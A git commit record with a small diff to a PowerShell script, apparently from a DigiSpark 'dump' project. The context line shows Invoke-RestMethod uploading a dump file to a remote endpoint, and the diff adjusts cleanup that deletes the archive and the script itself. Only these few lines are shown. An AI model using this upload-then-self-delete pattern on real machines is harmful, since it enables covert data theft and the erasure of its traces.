dcbfc38d59a4e2c2eecb2b9fe82880c9c1968bb0
Leonardo <34871458+LeozinH1@users.noreply.github.com>
2023-02-25 05:21:33 -0300

    Update script.ps1

--- script.ps1
+++ script.ps1
@@ -447,5 +447,4 @@ Invoke-RestMethod -Uri $endpoint -Method Post -InFile $dumpfile -Headers ${heade
 
 
 Remove-Item "Dump.zip"
-Remove-Item $PSCommandPath -Force 
-Remove-Item "C:\Users\leona\AppData\Local\DigiSparkDump"
+Remove-Item $PSCommandPath
